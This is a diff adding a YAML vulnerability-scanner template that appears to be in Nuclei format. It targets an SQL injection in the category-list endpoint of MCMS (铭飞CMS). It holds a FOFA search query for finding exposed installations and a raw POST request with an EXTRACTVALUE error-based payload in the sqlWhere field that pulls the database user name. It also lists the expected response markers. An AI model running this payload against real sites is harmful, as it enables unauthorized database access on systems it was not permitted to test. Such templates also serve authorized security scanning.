@@ -1,0 +1,42 @@
+id: poc-rk7yyc1a9g1d0yp3
+info:
+  name: 铭飞CMS category SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rk7yyc1a9g1d0yp3'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rk7yyc1a9g1d0yp3
+    fofa: body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
+http:
+- raw:
+  - 'POST /cms/category/list HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x5c,0x717a6a6271,(select user()),0x716b6a7871))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]
+
+
+    # 响应代码特征
+
+    500
+
+
+    # 响应内容特征
+
+    qzjbqroot
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
